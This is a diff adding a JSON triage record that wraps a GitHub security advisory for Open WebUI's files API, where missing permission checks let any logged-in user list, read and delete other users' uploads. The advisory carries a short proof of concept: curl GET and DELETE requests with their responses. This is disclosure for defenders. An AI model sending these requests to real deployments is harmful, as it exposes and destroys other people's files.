@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/18503035?v=4\", \"events_url\": \"https://api.github.com/users/vi11ain/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/vi11ain/followers\", \"following_url\": \"https://api.github.com/users/vi11ain/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/vi11ain/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/vi11ain\", \"id\": 18503035, \"login\": \"vi11ain\", \"node_id\": \"MDQ6VXNlcjE4NTAzMDM1\", \"organizations_url\": \"https://api.github.com/users/vi11ain/orgs\", \"received_events_url\": \"https://api.github.com/users/vi11ain/received_events\", \"repos_url\": \"https://api.github.com/users/vi11ain/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/vi11ain/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/vi11ain/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/vi11ain\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-45301\", \"cvss\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-284\", \"name\": \"Improper Access Control\"}], \"description\": \"### Summary\\nA missing permission check in all files related API endpoints allows any authenticated user to list, access and delete every file uploaded by every user to the platform.\\n\\n### Details\\nAll `files/` related endpoints lack permission checks.\\n\\n#### Listing all files\\nFor example, let's see how file listing is implemented:\\nhttps://github.com/open-webui/open-webui/blob/e2b7296786053dfc77f6ae0205a1b195e05a712c/backend/apps/webui/routers/files.py#L107-L110\\nhttps://github.com/open-webui/open-webui/blob/e2b7296786053dfc77f6ae0205a1b195e05a712c/backend/apps/webui/models/files.py#L26\\nNotice the endpoint depends only on an authenticated user check, no file filtering is done to match the uploaded files' `user_id` to the requesting user.\\n\\nThis problem repeats itself throughout the various route implementations, allowing any user to perform actions on any file.\\nSome note worthy functions:\\n#### Accessing the content of any file\\nhttps://github.com/open-webui/open-webui/blob/e2b7296786053dfc77f6ae0205a1b195e05a712c/backend/apps/webui/routers/files.py#L173-L193\\n#### Deleting any file\\nhttps://github.com/open-webui/open-webui/blob/e2b7296786053dfc77f6ae0205a1b195e05a712c/backend/apps/webui/routers/files.py#L224-L241\\n\\n### PoC\\n#### Configuration\\n1. I ran a clean install of the latest version using one of the docker one-liners on an Ubuntu desktop:\\n`docker run -d -p 3000:8080 -v ollama:/root/.ollama -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:ollama`\\n2. I created an admin user\\n3. I created a second user to act as the threat actor with no elevated permissions\\n4. Admin user uploaded `test.txt` in a conversation with model\\n5. Admin user uploaded `mydeepest_secret.docx` in a conversation with model\\n\\n#### Listing files uploaded by other users\\n1. Login to threat actor\\n2. Perform a GET request to `/api/v1/files/`\\n```sh\\ncurl -X 'GET' \\\\\\n  'http://localhost:3000/api/v1/files/' \\\\\\n  -H 'accept: application/json'\\n```\\n```json\\n[\\n  {\\n    \\\"id\\\": \\\"b9733e9c-0714-4425-8915-d0361bf66dfc\\\",\\n    \\\"user_id\\\": \\\"c0c16e7a-6f81-4863-8b71-e56e2e389cf1\\\",\\n    \\\"filename\\\": \\\"b9733e9c-0714-4425-8915-d0361bf66dfc_test.txt\\\",\\n    \\\"meta\\\": {\\n      \\\"name\\\": \\\"test.txt\\\",\\n      \\\"content_type\\\": \\\"text/plain\\\",\\n      \\\"size\\\": 4,\\n      \\\"path\\\": \\\"/app/backend/data/uploads/b9733e9c-0714-4425-8915-d0361bf66dfc_test.txt\\\"\\n    },\\n    \\\"created_at\\\": 1724709202\\n  },\\n  {\\n    \\\"id\\\": \\\"8f058e18-fec1-4b9f-bb4e-c17f39d03c98\\\",\\n    \\\"user_id\\\": \\\"c0c16e7a-6f81-4863-8b71-e56e2e389cf1\\\",\\n    \\\"filename\\\": \\\"8f058e18-fec1-4b9f-bb4e-c17f39d03c98_mydeepest_secret.docx\\\",\\n    \\\"meta\\\": {\\n      \\\"name\\\": \\\"mydeepest_secret.docx\\\",\\n      \\\"content_type\\\": \\\"application/vnd.openxmlformats-officedocument.wordprocessingml.document\\\",\\n      \\\"size\\\": 6485,\\n      \\\"path\\\": \\\"/app/backend/data/uploads/8f058e18-fec1-4b9f-bb4e-c17f39d03c98_mydeepest_secret.docx\\\"\\n    },\\n    \\\"created_at\\\": 1724710236\\n  }\\n]\\n```\\n\\n#### Accessing other users' file content\\n1. Login to threat actor\\n2. Perform a GET request to `/api/v1/files/{id}/content`\\n```sh\\ncurl -X 'GET' \\\\\\n  'http://localhost:3000/api/v1/files/b9733e9c-0714-4425-8915-d0361bf66dfc/content' \\\\\\n  -H 'accept: application/json'\\n```\\n```\\nwow\\n```\\n\\n#### Deleting another user's uploaded file\\n1. Login to threat actor\\n2. Perform a DELETE request to `/api/v1/files/{id}`\\n```sh\\ncurl -X 'DELETE' \\\\\\n  'http://localhost:3000/api/v1/files/8f058e18-fec1-4b9f-bb4e-c17f39d03c98' \\\\\\n  -H 'accept: application/json'\\n```\\n```json\\n{\\n  \\\"message\\\": \\\"File deleted successfully\\\"\\n}\\n```\\n3. We will verify this action by furthur listing all files as mentioned above:\\n```json\\n[\\n  {\\n    \\\"id\\\": \\\"b9733e9c-0714-4425-8915-d0361bf66dfc\\\",\\n    \\\"user_id\\\": \\\"c0c16e7a-6f81-4863-8b71-e56e2e389cf1\\\",\\n    \\\"filename\\\": \\\"b9733e9c-0714-4425-8915-d0361bf66dfc_test.txt\\\",\\n    \\\"meta\\\": {\\n      \\\"name\\\": \\\"test.txt\\\",\\n      \\\"content_type\\\": \\\"text/plain\\\",\\n      \\\"size\\\": 4,\\n      \\\"path\\\": \\\"/app/backend/data/uploads/b9733e9c-0714-4425-8915-d0361bf66dfc_test.txt\\\"\\n    },\\n    \\\"created_at\\\": 1724709202\\n  }\\n]\\n```\\n\\n### Impact\\nHaving access to user uploaded files, regardless of ownership or permission level, breaks the confidentiality of sensitive data stored by users. Furthermore, the ability to delete other user's uploaded files disrupts the integrity of the system.\\n\\n### Personal Notice\\nIn case this submission does get recognized and numbered as a CVE I'd perfer to be credited by my full name - Yuval Gal, instead of my GitHub handle.\\n\\nThanks in advance and have a good week (:\\n\\n## Credits\\n\\nThis vulnerability was reported by **Yuval Gal** (GitHub: @vi11ain).\", \"epss\": {\"percentage\": 0.00273, \"percentile\": 0.18824}, \"ghsa_id\": \"GHSA-r8wh-8m7r-fh33\", \"github_reviewed_at\": \"2026-05-14T20:15:53Z\", \"html_url\": \"https://github.com/advisories/GHSA-r8wh-8m7r-fh33\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-r8wh-8m7r-fh33\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-45301\"}], \"nvd_published_at\": \"2026-05-15T22:16:53Z\", \"published_at\": \"2026-05-14T20:15:53Z\", \"references\": [\"https://github.com/open-webui/open-webui/security/advisories/GHSA-r8wh-8m7r-fh33\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-45301\", \"https://github.com/advisories/GHSA-r8wh-8m7r-fh33\"], \"repository_advisory_url\": \"https://api.github.com/repos/open-webui/open-webui/security-advisories/GHSA-r8wh-8m7r-fh33\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/open-webui/open-webui\", \"summary\": \"Open WebUI: Missing permission check in files API allows authenticated users to list, access and delete every uploaded file\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-19T15:58:03Z\", \"url\": \"https://api.github.com/advisories/GHSA-r8wh-8m7r-fh33\", \"vulnerabilities\": [{\"first_patched_version\": \"0.3.16\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"open-webui\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.3.15\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-r8wh-8m7r-fh33",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "open-webui: <= 0.3.15"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-45301"
+    ],
+    "cvss_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "open-webui"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:01.747832Z",
+  "provenance": {
+    "content_sha256": "512bbed9828560817e4b4b553ae6f0aeb8000f586f3471960b4c1b69bbd635d7",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-14T20:15:53Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-r8wh-8m7r-fh33",
+  "status": "active",
+  "title": "Open WebUI: Missing permission check in files API allows authenticated users to list, access and delete every uploaded file",
+  "updated_at": "2026-05-19T15:58:03Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-r8wh-8m7r-fh33"
+}
